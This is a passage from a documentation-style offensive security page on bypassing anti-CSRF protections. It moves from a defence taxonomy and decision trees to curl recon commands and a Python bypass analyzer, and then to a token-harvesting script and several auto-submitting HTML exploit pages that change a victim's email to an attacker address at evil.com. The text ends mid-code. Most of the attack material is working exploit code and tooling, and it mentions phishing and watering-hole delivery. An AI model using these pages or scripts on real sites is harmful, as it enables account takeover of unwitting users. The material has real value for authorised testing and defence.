---
title: Anti-CSRF Bypass Techniques
description: CSRF protections including token-based defenses, SameSite cookies, referer validation, custom headers, and double-submit patterns across all modern frameworks.
navigation:
  icon: i-lucide-shield-alert
  title: Anti-CSRF Bypass Techniques
---

::badge
**CSRF-BYP-001**
::

::badge
**CVSS 8.8 — High**
::

::badge
**CWE-352**
::

::badge
**OWASP A01:2021**
::

::badge
**PCI DSS 6.5.9**
::

## Vulnerability Overview

::callout{icon="i-lucide-skull" color="red"}
**Anti-CSRF Bypass** techniques exploit weaknesses in CSRF defense implementations. Even when applications deploy CSRF tokens, SameSite cookies, referer checks, or custom headers, flawed logic in validation allows attackers to forge authenticated state-changing requests. A successful bypass means the attacker can perform any action the victim can — password changes, fund transfers, privilege escalation, account deletion — all without the victim's knowledge.
::

::note
CSRF protections fail in layers. A single implementation flaw in token generation, validation logic, cookie scope, or header checking creates a complete bypass. Testing must cover every layer independently.
::

## CSRF Protection Taxonomy

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    CSRF PROTECTION MECHANISMS                           │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. TOKEN-BASED DEFENSES                                                 │
│     ├── Synchronizer Token Pattern (hidden form field)                   │
│     ├── Double Submit Cookie                                             │
│     ├── Encrypted Token Pattern                                          │
│     ├── HMAC-Based Token                                                 │
│     └── Per-Request vs Per-Session Tokens                                │
│                                                                          │
│  2. HEADER-BASED DEFENSES                                                │
│     ├── Custom Request Headers (X-Requested-With, X-CSRF-Token)          │
│     ├── Origin Header Validation                                         │
│     ├── Referer Header Validation                                        │
│     └── Content-Type Restriction                                         │
│                                                                          │
│  3. COOKIE-BASED DEFENSES                                                │
│     ├── SameSite=Strict                                                  │
│     ├── SameSite=Lax                                                     │
│     ├── SameSite=None (requires Secure)                                  │
│     └── __Host- / __Secure- Cookie Prefixes                              │
│                                                                          │
│  4. INTERACTION-BASED DEFENSES                                           │
│     ├── CAPTCHA Verification                                             │
│     ├── Re-Authentication (password confirmation)                        │
│     └── Multi-Step Transaction Verification                              │
│                                                                          │
│  5. APPLICATION-LEVEL DEFENSES                                           │
│     ├── JSON-Only API Endpoints                                          │
│     ├── CORS Preflight Enforcement                                       │
│     └── Framework Built-in CSRF Middleware                                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

#code
```
Five categories of CSRF defenses — each with distinct bypass techniques
```
::

## Attack Decision Tree

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
                        ┌────────────────────┐
                        │  Identify CSRF     │
                        │  Protection Type   │
                        └─────────┬──────────┘
                                  │
         ┌────────────┬───────────┼───────────┬──────────────┐
         ▼            ▼           ▼           ▼              ▼
   ┌──────────┐ ┌──────────┐ ┌─────────┐ ┌─────────┐ ┌───────────┐
   │  TOKEN   │ │ SAMESITE │ │ REFERER │ │ CUSTOM  │ │ CONTENT   │
   │  BASED   │ │ COOKIE   │ │ CHECK   │ │ HEADER  │ │ TYPE      │
   └────┬─────┘ └────┬─────┘ └────┬────┘ └────┬────┘ └─────┬─────┘
        │             │            │           │            │
   ┌────▼─────┐  ┌────▼────┐ ┌────▼────┐ ┌────▼────┐ ┌─────▼─────┐
   │• Empty   │  │• Lax    │ │• Remove │ │• Flash  │ │• Form     │
   │  token   │  │  GET    │ │  header │ │  plugin │ │  enctype  │
   │• Remove  │  │  bypass │ │• Spoof  │ │• CORS   │ │• Text     │
   │  param   │  │• Top    │ │  via    │ │  miscon │ │  plain    │
   │• Reuse   │  │  level  │ │  redir  │ │• PDF    │ │• Blob     │
   │  token   │  │  nav    │ │• Strip  │ │  embed  │ │  upload   │
   │• Static  │  │• Scheme │ │  HTTPS  │ │• XSS    │ │• Fetch    │
   │  token   │  │  switch │ │• Data   │ │  chain  │ │  override │
   │• Decrypt │  │• Cookie │ │  URL    │ │         │ │           │
   │  predict │  │  inject │ │  trick  │ │         │ │           │
   │• Method  │  │• Sub    │ │         │ │         │ │           │
   │  switch  │  │  domain │ │         │ │         │ │           │
   └──────────┘  └─────────┘ └─────────┘ └─────────┘ └───────────┘
```

#code
```
Decision tree mapping protection types to specific bypass techniques
```
::

## Bypass Flow Diagrams

### Token Bypass Flow

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌─────────────────────────────────────────────────────────────────┐
│                TOKEN BYPASS ATTACK FLOW                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 1: ANALYZE TOKEN                                          │
│  ┌────────────┐    ┌──────────────────────────────────────┐     │
│  │ Capture    │───▶│ Is token in form field, header,      │     │
│  │ Request    │    │ cookie, or URL parameter?             │     │
│  └────────────┘    └───────────────┬──────────────────────┘     │
│                                    │                            │
│  STEP 2: TEST VALIDATION                                        │
│  ┌─────────────────────────────────▼──────────────────────┐     │
│  │ Remove token entirely          → Still works?    [Y/N] │     │
│  │ Send empty token value         → Still works?    [Y/N] │     │
│  │ Use different user's token     → Still works?    [Y/N] │     │
│  │ Use expired/old token          → Still works?    [Y/N] │     │
│  │ Modify one character           → Still works?    [Y/N] │     │
│  │ Switch HTTP method (POST→GET)  → Still works?    [Y/N] │     │
│  │ Change parameter name          → Still works?    [Y/N] │     │
│  │ Duplicate token parameter      → Still works?    [Y/N] │     │
│  │ Send token in different spot   → Still works?    [Y/N] │     │
│  └─────────────────────────────────┬──────────────────────┘     │
│                                    │                            │
│  STEP 3: EXPLOIT                   ▼                            │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ Any [Y] above = Bypass found                        │       │
│  │ Build exploit HTML/JS based on specific bypass       │       │
│  │ Deliver to victim (phishing, watering hole, etc.)    │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#code
```
Systematic token validation testing flow - check each validation weakness
```
::

### SameSite Cookie Bypass Flow

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌────────────────────────────────────────────────────────────────────┐
│                SAMESITE BYPASS DECISION FLOW                       │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  ┌──────────────────┐                                              │
│  │ Read Set-Cookie   │                                              │
│  │ SameSite value    │                                              │
│  └────────┬─────────┘                                              │
│           │                                                        │
│    ┌──────┼──────────┬──────────────┐                              │
│    ▼      ▼          ▼              ▼                              │
│  ┌─────┐ ┌─────┐  ┌──────┐  ┌───────────┐                        │
│  │None │ │Lax  │  │Strict│  │Not Set    │                        │
│  └──┬──┘ └──┬──┘  └──┬───┘  │(default  │                        │
│     │       │        │      │= Lax)    │                        │
│     ▼       ▼        ▼      └─────┬─────┘                        │
│  ┌──────┐ ┌─────────────────┐     │                              │
│  │CSRF  │ │• Top-level GET  │     ▼                              │
│  │works │ │  navigation     │  ┌──────────────────┐              │
│  │as    │ │• window.open    │  │ Treat as Lax     │              │
│  │normal│ │• <a> click      │  │ (Chrome default) │              │
│  │      │ │• 302 redirect   │  └──────────────────┘              │
│  │Check │ │• Method override│                                     │
│  │Secure│ │• Scheme switch  │  ┌──────────────────────────┐      │
│  │flag  │ │  (http→https)   │  │ Strict bypass requires:  │      │
│  └──────┘ │• 2-min window   │  │ • XSS on same site       │      │
│           │  (Chrome Lax+   │  │ • Sibling subdomain XSS  │      │
│           │   POST)         │  │ • Cookie injection via    │      │
│           └─────────────────┘  │   related domain          │      │
│                                │ • Client-side redirect    │      │
│                                │   gadget on same site     │      │
│                                └──────────────────────────┘      │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

#code
```
SameSite cookie bypass depends on the attribute value and browser behavior
```
::

## Reconnaissance & Analysis

### Identifying CSRF Protections

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Curl Analysis"}

  ::code-preview
  Extract CSRF tokens from HTML forms.

  #code
  ```bash
  curl -s -c cookies.txt https://target.com/account/settings | grep -iE "(csrf|token|_token|authenticity|nonce|xsrf)" | head -20
  ```
  ::

  ::code-preview
  Extract hidden input fields containing tokens.

  #code
  ```bash
  curl -s -b cookies.txt https://target.com/account/settings | grep -oP '<input[^>]*type="hidden"[^>]*>' | grep -iE "(csrf|token|nonce|xsrf)"
  ```
  ::

  ::code-preview
  Check Set-Cookie headers for SameSite and CSRF cookie attributes.

  #code
  ```bash
  curl -sI -c- https://target.com/login 2>&1 | grep -iE "(set-cookie|samesite|secure|httponly|__host|__secure)"
  ```
  ::

  ::code-preview
  Analyze all response headers for CSRF-related defenses.

  #code
  ```bash
  curl -v -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=valid" \
    -d "email=test@test.com" \
    https://target.com/api/user/email 2>&1 | grep -iE "(csrf|token|forbidden|x-frame|x-xss|referer|origin|403|400)"
  ```
  ::

  ::code-preview
  Test if endpoint accepts request without any CSRF token.

  #code
  ```bash
  # First: normal request with token
  curl -s -o /dev/null -w "WITH TOKEN: %{http_code}\n" \
    -X POST -b cookies.txt \
    -d "email=new@test.com&csrf_token=VALID_TOKEN" \
    https://target.com/account/email

  # Then: request without token
  curl -s -o /dev/null -w "NO TOKEN: %{http_code}\n" \
    -X POST -b cookies.txt \
    -d "email=new@test.com" \
    https://target.com/account/email
  ```
  ::

  ::code-preview
  Test if endpoint accepts empty CSRF token.

  #code
  ```bash
  curl -s -o /dev/null -w "EMPTY TOKEN: %{http_code}\n" \
    -X POST -b cookies.txt \
    -d "email=new@test.com&csrf_token=" \
    https://target.com/account/email
  ```
  ::

  ::code-preview
  Test HTTP method switching (POST to GET).

  #code
  ```bash
  curl -s -o /dev/null -w "GET METHOD: %{http_code}\n" \
    -b cookies.txt \
    "https://target.com/account/email?email=new@test.com"
  ```
  ::

  ::code-preview
  Check Referer header validation.

  #code
  ```bash
  # No Referer
  curl -s -o /dev/null -w "NO REFERER: %{http_code}\n" \
    -X POST -b cookies.txt \
    -H "Referer: " \
    -d "email=new@test.com&csrf_token=VALID" \
    https://target.com/account/email

  # Evil Referer
  curl -s -o /dev/null -w "EVIL REFERER: %{http_code}\n" \
    -X POST -b cookies.txt \
    -H "Referer: https://evil.com/page" \
    -d "email=new@test.com&csrf_token=VALID" \
    https://target.com/account/email
  ```
  ::

  ::code-preview
  Check Origin header validation.

  #code
  ```bash
  # No Origin
  curl -s -o /dev/null -w "NO ORIGIN: %{http_code}\n" \
    -X POST -b cookies.txt \
    -d "email=new@test.com" \
    https://target.com/account/email

  # Evil Origin
  curl -s -o /dev/null -w "EVIL ORIGIN: %{http_code}\n" \
    -X POST -b cookies.txt \
    -H "Origin: https://evil.com" \
    -d "email=new@test.com" \
    https://target.com/account/email
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-code" label="Python Analyzer"}

  ::code-collapse

  ```python [csrf_analyzer.py]
  #!/usr/bin/env python3
  """Comprehensive CSRF Protection Analyzer"""

  import requests
  import re
  import sys
  import json
  from urllib.parse import urlparse
  import urllib3
  urllib3.disable_warnings()

  class CSRFAnalyzer:
      def __init__(self, target_url, cookies=None, proxy=None):
          self.target = target_url
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              for c in cookies.split(';'):
                  k, v = c.strip().split('=', 1)
                  self.session.cookies.set(k, v)
          if proxy:
              self.session.proxies = {'http': proxy, 'https': proxy}
          self.findings = []

      def analyze_cookies(self):
          """Analyze SameSite and security attributes"""
          print("\n[*] COOKIE ANALYSIS")
          print("=" * 50)
          resp = self.session.get(self.target)
          for cookie in self.session.cookies:
              attrs = {
                  'name': cookie.name,
                  'domain': cookie.domain,
                  'path': cookie.path,
                  'secure': cookie.secure,
                  'httponly': bool(cookie._rest.get('HttpOnly', False)),
                  'samesite': cookie._rest.get('SameSite', 'NOT SET')
              }
              print(f"  Cookie: {cookie.name}")
              print(f"    Domain: {cookie.domain}")
              print(f"    Secure: {cookie.secure}")
              print(f"    SameSite: {attrs['samesite']}")
              
              if attrs['samesite'] == 'NOT SET':
                  self.findings.append(f"Cookie '{cookie.name}' missing SameSite (defaults to Lax)")
              if attrs['samesite'] == 'None' and not cookie.secure:
                  self.findings.append(f"Cookie '{cookie.name}' SameSite=None without Secure flag")

      def find_csrf_tokens(self):
          """Extract CSRF tokens from response"""
          print("\n[*] TOKEN EXTRACTION")
          print("=" * 50)
          resp = self.session.get(self.target)
          
          # HTML hidden inputs
          tokens = re.findall(
              r'<input[^>]*name=["\']([^"\']*(?:csrf|token|nonce|xsrf|authenticity)[^"\']*)["\'][^>]*value=["\']([^"\']*)["\']',
              resp.text, re.IGNORECASE
          )
          tokens += re.findall(
              r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']*(?:csrf|token|nonce|xsrf|authenticity)[^"\']*)["\']',
              resp.text, re.IGNORECASE
          )
          
          # Meta tags
          meta_tokens = re.findall(
              r'<meta[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*content=["\']([^"\']*)["\']',
              resp.text, re.IGNORECASE
          )
          
          # JavaScript variables
          js_tokens = re.findall(
              r'(?:csrf|token|xsrf|nonce)\s*[=:]\s*["\']([a-zA-Z0-9+/=_-]{16,})["\']',
              resp.text, re.IGNORECASE
          )
          
          # Response headers
          header_tokens = {k: v for k, v in resp.headers.items()
                         if any(t in k.lower() for t in ['csrf', 'xsrf', 'token'])}
          
          print(f"  Hidden inputs: {len(tokens)}")
          for name, value in tokens:
              print(f"    {name} = {value[:50]}...")
          print(f"  Meta tags: {len(meta_tokens)}")
          print(f"  JS variables: {len(js_tokens)}")
          print(f"  Response headers: {header_tokens}")
          
          return tokens, meta_tokens, js_tokens, header_tokens

      def test_token_validation(self, post_data, token_field='csrf_token'):
          """Test various token validation bypasses"""
          print("\n[*] TOKEN VALIDATION TESTS")
          print("=" * 50)
          
          tests = [
              ("No token parameter", {k: v for k, v in post_data.items() if k != token_field}),
              ("Empty token", {**post_data, token_field: ''}),
              ("Null token", {**post_data, token_field: 'null'}),
              ("Zero token", {**post_data, token_field: '0'}),
              ("Space token", {**post_data, token_field: ' '}),
              ("Array token", {**post_data, f'{token_field}[]': 'test'}),
              ("Modified token (1 char)", {**post_data, token_field: post_data.get(token_field, 'x')[:-1] + 'X'}),
              ("Reversed token", {**post_data, token_field: post_data.get(token_field, '')[::-1]}),
              ("Short token", {**post_data, token_field: 'a'}),
              ("Long token", {**post_data, token_field: 'A' * 1000}),
              ("Unicode token", {**post_data, token_field: '⚡' * 32}),
          ]
          
          for test_name, data in tests:
              try:
                  resp = self.session.post(self.target, data=data, allow_redirects=False)
                  status = resp.status_code
                  success = status in [200, 301, 302, 303]
                  marker = "✓ BYPASS" if success else "✗ BLOCKED"
                  color = "\033[91m" if success else "\033[92m"
                  print(f"  {color}[{marker}]\033[0m {test_name} -> HTTP {status}")
                  if success:
                      self.findings.append(f"Token bypass: {test_name}")
              except Exception as e:
                  print(f"  [ERROR] {test_name}: {e}")

      def test_method_switching(self, post_data):
          """Test HTTP method override bypasses"""
          print("\n[*] METHOD SWITCHING TESTS")
          print("=" * 50)
          
          # POST to GET
          resp = self.session.get(self.target, params=post_data, allow_redirects=False)
          print(f"  POST→GET: HTTP {resp.status_code}")
          
          # Method override headers
          for header in ['X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override', '_method']:
              resp = self.session.post(
                  self.target,
                  data=post_data,
                  headers={header: 'GET'} if not header.startswith('_') else {},
                  allow_redirects=False
              )
              if header.startswith('_'):
                  post_data_with_method = {**post_data, '_method': 'GET'}
                  resp = self.session.post(self.target, data=post_data_with_method, allow_redirects=False)
              print(f"  {header}: HTTP {resp.status_code}")

      def test_content_type(self, post_data):
          """Test Content-Type bypass techniques"""
          print("\n[*] CONTENT-TYPE BYPASS TESTS")
          print("=" * 50)
          
          content_types = [
              'application/x-www-form-urlencoded',
              'text/plain',
              'multipart/form-data',
              'application/json',
              'application/xml',
              'text/xml',
              'text/html',
              'application/x-www-form-urlencoded; charset=UTF-8',
              'text/plain; charset=utf-8',
              '',
          ]
          
          for ct in content_types:
              headers = {'Content-Type': ct} if ct else {}
              try:
                  if 'json' in ct:
                      import json as j
                      resp = self.session.post(self.target, data=j.dumps(post_data), headers=headers, allow_redirects=False)
                  else:
                      resp = self.session.post(self.target, data=post_data, headers=headers, allow_redirects=False)
                  print(f"  Content-Type: {ct or '(empty)'} -> HTTP {resp.status_code}")
              except Exception as e:
                  print(f"  Content-Type: {ct} -> ERROR: {e}")

      def test_referer_origin(self, post_data):
          """Test Referer/Origin header validation"""
          print("\n[*] REFERER/ORIGIN VALIDATION TESTS")
          print("=" * 50)
          
          domain = urlparse(self.target).netloc
          
          referer_tests = [
              ("No Referer", {}),
              ("Empty Referer", {"Referer": ""}),
              ("Evil Referer", {"Referer": "https://evil.com"}),
              ("Target in path", {"Referer": f"https://evil.com/{domain}"}),
              ("Target in query", {"Referer": f"https://evil.com/?ref={domain}"}),
              ("Target as subdomain", {"Referer": f"https://{domain}.evil.com"}),
              ("Target in fragment", {"Referer": f"https://evil.com/#{domain}"}),
              ("HTTP downgrade", {"Referer": f"http://{domain}"}),
              ("Subdomain", {"Referer": f"https://sub.{domain}"}),
              ("Data URI", {"Referer": "data:text/html,test"}),
          ]
          
          for test_name, headers in referer_tests:
              resp = self.session.post(self.target, data=post_data, headers=headers, allow_redirects=False)
              success = resp.status_code in [200, 301, 302, 303]
              marker = "✓ BYPASS" if success else "✗ BLOCKED"
              print(f"  [{marker}] {test_name} -> HTTP {resp.status_code}")
              if success:
                  self.findings.append(f"Referer bypass: {test_name}")

      def run_full_analysis(self, post_data=None, token_field='csrf_token'):
          if post_data is None:
              post_data = {'email': 'attacker@evil.com', token_field: 'test_token'}
          
          self.analyze_cookies()
          self.find_csrf_tokens()
          self.test_token_validation(post_data, token_field)
          self.test_method_switching(post_data)
          self.test_content_type(post_data)
          self.test_referer_origin(post_data)
          
          print("\n" + "=" * 50)
          print(f"[*] FINDINGS SUMMARY: {len(self.findings)} bypasses found")
          for f in self.findings:
              print(f"  \033[91m[!] {f}\033[0m")
          
          return self.findings

  if __name__ == '__main__':
      target = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/account/settings'
      cookies = sys.argv[2] if len(sys.argv) > 2 else 'session=valid'
      analyzer = CSRFAnalyzer(target, cookies=cookies, proxy='http://127.0.0.1:8080')
      analyzer.run_full_analysis()
  ```

  ::

  :::

  :::tabs-item{icon="i-lucide-scan" label="Automated Tools"}

  ::code-preview
  XSRFProbe comprehensive scan.

  #code
  ```bash
  python3 xsrfprobe.py -u https://target.com/account/settings --crawl --cookie "session=valid" -v
  ```
  ::

  ::code-preview
  Bolt CSRF scanner.

  #code
  ```bash
  python3 bolt.py -u https://target.com/account/settings -d "email=test@test.com" --cookie "session=valid"
  ```
  ::

  ::code-preview
  Nuclei CSRF templates.

  #code
  ```bash
  nuclei -l targets.txt -tags csrf -severity critical,high \
    -H "Cookie: session=valid" -o csrf-findings.txt
  ```
  ::

  ::code-preview
  Custom Burp Intruder CSRF token test.

  #code
  ```
  POST /account/email HTTP/1.1
  Host: target.com
  Cookie: session=valid_session
  Content-Type: application/x-www-form-urlencoded

  email=attacker@evil.com&csrf_token=§token_payload§
  ```
  ::

  :::
::

## Bypass Technique 1 — Token Removal & Manipulation

::callout{icon="i-lucide-alert-triangle" color="amber"}
The most common CSRF bypass — many applications only validate the token **if it's present** in the request. Removing the parameter entirely bypasses validation.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Remove Token Parameter"}
  ```html [remove-token.html]
  <!-- Original form has: <input type="hidden" name="csrf_token" value="abc123"> -->
  <!-- Bypass: simply omit the csrf_token field -->

  <html>
  <body>
  <h1>Click to claim your prize!</h1>
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- csrf_token parameter completely removed -->
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Empty Token Value"}
  ```html [empty-token.html]
  <html>
  <body>
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Arbitrary Token Value"}
  ```html [arbitrary-token.html]
  <html>
  <body>
  <!-- Server checks token exists but doesn't validate its value -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="anything_works_here">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Curl Validation"}
  ```bash [validate-removal.sh]
  #!/bin/bash
  TARGET="https://target.com/account/email"
  COOKIE="session=valid_session_token"
  
  echo "[*] Testing token removal bypasses..."
  
  # With valid token
  echo -n "[1] Valid token: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=VALID_TOKEN" "$TARGET"
  echo ""
  
  # Without token parameter
  echo -n "[2] No token param: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com" "$TARGET"
  echo ""
  
  # Empty token
  echo -n "[3] Empty token: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=" "$TARGET"
  echo ""
  
  # Null string
  echo -n "[4] Null string: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=null" "$TARGET"
  echo ""
  
  # Zero
  echo -n "[5] Zero value: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=0" "$TARGET"
  echo ""
  
  # Undefined
  echo -n "[6] Undefined: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=undefined" "$TARGET"
  echo ""
  
  # Array notation
  echo -n "[7] Array param: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token[]=test" "$TARGET"
  echo ""
  
  # Random token
  echo -n "[8] Random token: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&csrf_token=$(openssl rand -hex 32)" "$TARGET"
  echo ""
  
  # Different parameter name
  echo -n "[9] Wrong param name (_token): "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "email=test@evil.com&_token=VALID_TOKEN" "$TARGET"
  echo ""
  
  # Token in header instead of body
  echo -n "[10] Token in header: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -H "X-CSRF-Token: VALID_TOKEN" \
    -d "email=test@evil.com" "$TARGET"
  echo ""
  ```
  :::
::

## Bypass Technique 2 — Token Not Tied to Session

::warning
When CSRF tokens are valid globally (not bound to a specific user session), an attacker can use their own valid token in the exploit.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cross-User Token"}
  ```html [cross-user-token.html]
  <html>
  <body>
  <!-- Use attacker's own valid CSRF token against victim -->
  <!-- Token was obtained from attacker's authenticated session -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="ATTACKERS_OWN_VALID_TOKEN">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Token Harvesting Script"}
  ```python [harvest-token.py]
  #!/usr/bin/env python3
  """Harvest a valid CSRF token using attacker's own session"""

  import requests
  import re
  import sys

  TARGET = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/account/settings'

  session = requests.Session()
  session.verify = False

  # Login as attacker
  session.post('https://target.com/login', data={
      'username': 'attacker_account',
      'password': 'attacker_password'
  })

  # Fetch page with CSRF token
  resp = session.get(TARGET)

  # Extract token
  token_patterns = [
      r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
      r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
      r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
      r'csrf["\s]*[:=]\s*["\']([a-zA-Z0-9+/=_-]{20,})["\']',
      r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
  ]

  for pattern in token_patterns:
      match = re.search(pattern, resp.text)
      if match:
          token = match.group(1)
          print(f"[+] Harvested CSRF Token: {token}")
          
          # Generate exploit
          exploit = f'''<html>
  <body>
  <form action="{TARGET}" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf_token" value="{token}">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>'''
          
          with open('csrf_exploit.html', 'w') as f:
              f.write(exploit)
          print("[+] Exploit saved to csrf_exploit.html")
          break
  else:
      print("[-] No CSRF token found")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Curl Token Swap Test"}

  ::code-preview
  Get token from attacker session and use in victim request.

  #code
  ```bash
  # Step 1: Get attacker's CSRF token
  ATTACKER_TOKEN=$(curl -s -c attacker_cookies.txt \
    -d "username=attacker&password=pass" \
    https://target.com/login && \
  curl -s -b attacker_cookies.txt https://target.com/account/settings | \
    grep -oP 'csrf_token.*?value="([^"]+)"' | grep -oP '"[^"]+"' | tr -d '"')

  echo "[+] Attacker token: $ATTACKER_TOKEN"

  # Step 2: Use attacker's token with victim's session
  curl -s -o /dev/null -w "Cross-user token: %{http_code}\n" \
    -X POST -b "session=VICTIM_SESSION_COOKIE" \
    -d "email=attacker@evil.com&csrf_token=$ATTACKER_TOKEN" \
    https://target.com/account/email
  ```
  ::

  :::
::

## Bypass Technique 3 — HTTP Method Switching

::tabs
  :::tabs-item{icon="i-lucide-code" label="POST to GET"}
  ```html [method-get.html]
  <html>
  <body>
  <!-- Convert POST to GET — many apps only check CSRF on POST -->
  <img src="https://target.com/account/email?email=attacker@evil.com" style="display:none">

  <!-- Or use anchor tag for top-level navigation -->
  <a href="https://target.com/account/email?email=attacker@evil.com" id="link">Click here</a>
  <script>document.getElementById('link').click();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Method Override Headers"}
  ```html [method-override.html]
  <html>
  <body>
  <script>
  // X-HTTP-Method-Override: turn GET into PUT/DELETE
  fetch('https://target.com/api/user/email', {
    method: 'GET',   // Actual method
    headers: {
      'X-HTTP-Method-Override': 'POST',
      'X-Method-Override': 'POST',
      'X-HTTP-Method': 'POST'
    },
    credentials: 'include'
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="_method Parameter"}
  ```html [method-param.html]
  <html>
  <body>
  <!-- Rails/Laravel _method override via GET parameter -->
  <img src="https://target.com/account/email?_method=POST&email=attacker@evil.com" style="display:none">

  <!-- Form-based method override -->
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="_method" value="PUT">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Curl Method Tests"}

  ::code-preview
  Comprehensive HTTP method testing.

  #code
  ```bash
  #!/bin/bash
  TARGET="https://target.com/account/email"
  COOKIE="session=victim_session"
  DATA="email=attacker@evil.com"

  echo "[*] HTTP Method Override Testing"

  for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
    echo -n "  $method: "
    curl -s -o /dev/null -w "%{http_code}" -X "$method" -b "$COOKIE" -d "$DATA" "$TARGET"
    echo ""
  done

  echo ""
  echo "[*] Method Override Headers"

  for header in "X-HTTP-Method-Override" "X-HTTP-Method" "X-Method-Override"; do
    echo -n "  GET + $header: POST -> "
    curl -s -o /dev/null -w "%{http_code}" -X GET -b "$COOKIE" \
      -H "$header: POST" "$TARGET?$DATA"
    echo ""
  done

  echo ""
  echo "[*] _method Parameter Override"
  echo -n "  POST + _method=PUT: "
  curl -s -o /dev/null -w "%{http_code}" -X POST -b "$COOKIE" \
    -d "$DATA&_method=PUT" "$TARGET"
  echo ""
  echo -n "  GET + _method=POST: "
  curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE" \
    "$TARGET?$DATA&_method=POST"
  echo ""
  ```
  ::

  :::
::

## Bypass Technique 4 — Content-Type Manipulation

::callout{icon="i-lucide-info" color="blue"}
APIs that enforce CSRF only on `application/json` requests can be bypassed using form-submittable content types (`text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`) — the only three types HTML forms can produce without preflight.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Text/Plain JSON Smuggle"}
  ```html [text-plain-json.html]
  <html>
  <body>
  <!-- enctype="text/plain" sends body without URL encoding -->
  <!-- Craft input name+value to form valid JSON -->
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","dummy":"' value='"}'>
  </form>
  <script>document.forms[0].submit();</script>

  <!--
  This sends the body as:
  {"email":"attacker@evil.com","dummy":"="}
  
  Content-Type: text/plain
  The server may parse this as JSON despite the Content-Type
  -->
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Form-Encoded to JSON Endpoint"}
  ```html [form-to-json.html]
  <html>
  <body>
  <!-- Some JSON APIs also accept form-encoded data -->
  <form action="https://target.com/api/user/email" method="POST" 
        enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Multipart Form Data"}
  ```html [multipart-bypass.html]
  <html>
  <body>
